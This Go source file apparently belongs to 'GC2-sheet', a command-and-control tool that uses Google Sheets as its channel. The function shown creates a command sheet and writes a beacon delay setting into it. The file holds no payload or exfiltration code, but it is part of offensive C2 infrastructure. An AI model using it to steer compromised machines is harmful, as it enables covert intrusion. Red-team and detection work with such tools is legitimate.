package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"google.golang.org/api/sheets/v4"
)

func createSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet)  {

	sheetName := spreadSheet.CommandSheet.Name

	var requests []*sheets.Request

	request := &sheets.Request{}
	addSheetRequest := &sheets.AddSheetRequest{}
	sheetProperties := &sheets.SheetProperties{Title: sheetName}

	addSheetRequest.Properties = sheetProperties
	request.AddSheet = addSheetRequest
	requests = append(requests, request)

	batchupDateSpreadSheetRequest := &sheets.BatchUpdateSpreadsheetRequest{Requests: requests}

	_, err := client.Spreadsheets.BatchUpdate(spreadSheet.SpreadSheetId, batchupDateSpreadSheetRequest).Do()

	if err != nil {
		utils.LogFatalDebug("Error creating new sheet: " + err.Error())
	}

	writeRange := sheetName + "!D2:" + spreadSheet.CommandSheet.RangeTickerConfiguration
	writeData := [][]interface{}{{"Delay configuration (sec)", spreadSheet.CommandSheet.Ticker}}

	var valueRange = &sheets.ValueRange{
		Range:  writeRange,
		Values: writeData,
	}

	//var vr sheets.ValueRange
	//myVal := []interface{}{"One"}
	//vr.Values = append(vr.Values, myVal)

	_, err = client.Spreadsheets.Values.Update(spreadSheet.SpreadSheetId, writeRange, valueRange).ValueInputOption("RAW").Do()
	if err != nil {
		utils.LogFatalDebug("Error writing default configuration: " + err.Error())
	}

}
